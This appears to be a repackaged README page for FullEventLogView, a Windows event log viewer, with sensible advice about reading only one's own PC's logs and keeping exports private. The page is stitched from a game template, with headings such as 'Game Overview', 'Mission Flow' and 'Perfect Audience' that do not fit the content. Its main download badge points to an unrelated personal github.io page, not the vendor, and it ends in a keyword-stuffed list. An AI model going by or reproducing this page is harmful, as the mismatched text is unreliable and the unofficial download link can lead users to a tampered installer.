# FullEventLogView - Read the Event Log on This PC

[![GET FullEventLogView](https://img.shields.io/badge/GET%20%E2%80%94%20FullEventLogView-166534?style=for-the-badge&logoColor=white)](https://lisaharrisj550.github.io/.github/fulleventlogview-levels)

## Game Overview

FullEventLogView lists records from the Windows event log on this computer. You use it to see why an app crashed, why a service stopped, or what an update reported. It is a viewer for this PC. It does not watch another person's computer, and it is not a way to erase records so activity is harder to see.

The log can contain user names, paths, and error text from this machine. Treat an export as private. Save it only if you need to show someone who is helping you with this PC, and do not post it in public with those details still in it. Reading the log does not fix the error. It tells you the message Windows stored.

## Play Your Way

Look at a recent error. Open the viewer, sort by time, and read one record from today that you recognize, such as a program you saw fail. Note the source and the time. That is enough for a first session.

Export only when you need a file to keep. A CSV of the whole log is large and full of ordinary noise. Filter to the hour of the failure first. Do not delete log entries to hide a mistake or a program you ran. If this is not your PC, close the tool.

## Mission Flow

Run it on the PC that had the problem, with an account that is allowed to read the log. Find the time of the crash. Read the description. Write down the source name if you will look up that component later.

If you export, put the file in a folder you control, not a public share. Close the viewer when you are done. Updating or reinstalling a driver still happens in that vendor's own installer, not by clearing the log. A record you do not understand is a note, not an order to delete a system file.

## Included Content

- A list of event log records from this PC
- Time, source, and a description you can read
- A filter so you are not stuck in years of noise
- An export you can keep private if you need it
- A view that does not require you to delete anything
- No connection to someone else's computer

![FullEventLogView showing events from the user's own PC](https://www.nirsoft.net/utils/fulleventlogview.png)

## Hardware Notes

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| RAM | 1 GB | 4 GB if the log is large |
| Storage | Small install | Room only if you export |
| CPU | Dual-core | Any current PC |
| GPU | Integrated | Not required |

## Perfect Audience

FullEventLogView fits a crash on your own PC when you want the message Windows saved, and a moment after an update when you want to see whether a service reported a failure.

It does not fit a wish to wipe history, a PC you do not administer, or a hunt through another user's activity. Read the record. Fix the cause in the normal settings or the vendor's installer.

## Common Issues

An empty list is often a filter, or an account that cannot read that log. Clear the filter before you assume the log is blank. Access denied means you need an administrator on this PC, not a different computer. A huge export is the unfiltered log. Narrow the time. Do not delete events because the list looks messy. The next crash will be harder to explain if the record is gone.

## Extended Notes

Write down the time and the source before you close the window. An export you email should have private paths removed if the helper does not need them. The viewer does not replace a backup, and it does not repair a disk. If the PC is not yours, do not open the log.

## Further Reading

fulleventlogview time filter, error level, source name, this pc, export kept private, do not wipe the log, own machine, note the hour
